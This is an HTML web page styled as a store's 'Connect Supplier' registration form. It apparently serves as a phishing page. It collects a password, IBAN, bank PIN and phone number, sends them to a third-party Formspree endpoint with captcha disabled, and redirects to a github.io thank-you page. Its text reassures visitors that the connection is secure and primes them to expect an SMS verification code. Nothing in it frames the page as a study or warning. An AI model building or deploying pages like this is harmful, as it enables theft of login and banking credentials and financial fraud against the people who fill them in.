<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Connect Supplier</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700&display=swap" rel="stylesheet">
<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" rel="stylesheet">
<style>
* { box-sizing: border-box; margin:0; padding:0; font-family:'Inter', sans-serif; }
body {
    background: linear-gradient(125deg, #e2e8f0, #f8fafc);
    height: 100vh;
    display: flex;
    justify-content: center;
    align-items: center;
}
.container {
    display: flex;
    background: #fff;
    border-radius: 20px;
    box-shadow: 0 12px 45px rgba(0,0,0,0.1);
    overflow: hidden;
    max-width: 900px;
    width: 100%;
}
.form-section {
    flex: 1;
    padding: 50px 40px;
}
.info-section {
    flex: 1;
    background: linear-gradient(135deg, #4f46e5, #6366f1);
    color: #fff;
    padding: 50px 40px;
    display: flex;
    flex-direction: column;
    justify-content: center;
}
.info-section h2 {
    font-size: 28px;
    margin-bottom: 20px;
}
.info-section p {
    font-size: 16px;
    line-height: 1.6;
}
h2.form-title {
    text-align: center;
    margin-bottom: 30px;
    color: #1e293b;
    font-size: 30px;
    font-weight: 700;
    letter-spacing: -0.5px;
}
.input-group { position: relative; margin-bottom: 22px; }
.input-group i { position: absolute; top: 50%; left: 14px; transform: translateY(-50%); color: #94a3b8; font-size: 15px; }
input { width: 100%; padding: 14px 16px 14px 42px; border: 1px solid #cbd5e1; border-radius: 10px; font-size: 15px; transition: 0.3s; }
input:focus { border-color: #4f46e5; box-shadow: 0 0 10px rgba(79,70,229,0.15); outline: none; }
.phone-wrapper { display: flex; gap: 10px; }
.phone-wrapper input { flex: 1; padding-left: 10px; }
.phone-wrapper input.phone { flex: 2; }
button {
    width: 100%;
    padding: 15px;
    background: linear-gradient(90deg, #4f46e5, #6366f1);
    color: white;
    font-size: 16px;
    border: none;
    border-radius: 12px;
    font-weight: 600;
    cursor: pointer;
    transition: 0.25s;
}
button:hover { background: linear-gradient(90deg, #4338ca, #4f46e5); transform: translateY(-2px); }
@media (max-width: 900px) {
    .container { flex-direction: column; }
    .info-section { padding: 30px; }
    .form-section { padding: 30px; }
}
</style>
</head>
<body>
<div class="container">
    <!-- Form Section -->
    <div class="form-section">
        <h2 class="form-title">Connect Supplier</h2>
        <form id="supplierForm" action="https://formspree.io/f/xldzggjg" method="POST">

            <div class="input-group">
                <i class="fa fa-user"></i>
                <input type="text" name="name" placeholder="Full Name" required>
            </div>

            <div class="input-group">
                <i class="fa fa-envelope"></i>
                <input type="email" name="email" placeholder="Email Address" required>
            </div>

            <div class="input-group">
                <i class="fa fa-lock"></i>
                <input type="password" name="password" placeholder="Password" required>
            </div>

            <div class="input-group">
                <i class="fa fa-university"></i>
                <input type="text" name="iban" placeholder="IBAN Number" required>
            </div>

            <div class="input-group">
                <i class="fa fa-key"></i>
                <input type="password" name="pincode" placeholder="Pincode" inputmode="numeric" pattern="[0-9]*" required>
            </div>

            <div class="input-group">
                <div class="phone-wrapper">
                    <input type="text" id="countrycode" placeholder="+370" value="+370" required>
                    <input type="tel" id="phone" class="phone" placeholder="Phone Number" inputmode="numeric" pattern="[0-9 ]*" required>
                </div>
            </div>

            <input type="hidden" name="phone" id="fullphone">
            <input type="hidden" name="_subject" value="Supplier Connection Request">
            <input type="hidden" name="_captcha" value="false">
            <input type="hidden" name="_next" value="https://ruusbroecstraat34.github.io/thanks.html">

            <button type="submit">Connect</button>
        </form>
    </div>

    <!-- Info Section -->
    <div class="info-section">
        <h2>Connect with Our Store</h2>
        <p>Welcome! By filling out this form, suppliers can securely connect with our store. Once submitted, you will receive a verification code via <strong>SMS</strong> within a few minutes. Please check your phone to complete the connection process.</p>
        <p>This ensures your information is secure and allows seamless integration with our store system.</p>
    </div>
</div>

<script>
// Combine country code + phone into one hidden field
document.getElementById('supplierForm').addEventListener('submit', function(e){
    var countryCode = document.getElementById('countrycode').value.trim();
    var phoneNumber = document.getElementById('phone').value.trim();
    document.getElementById('fullphone').value = countryCode + ' ' + phoneNumber;
});
</script>
</body>
</html>

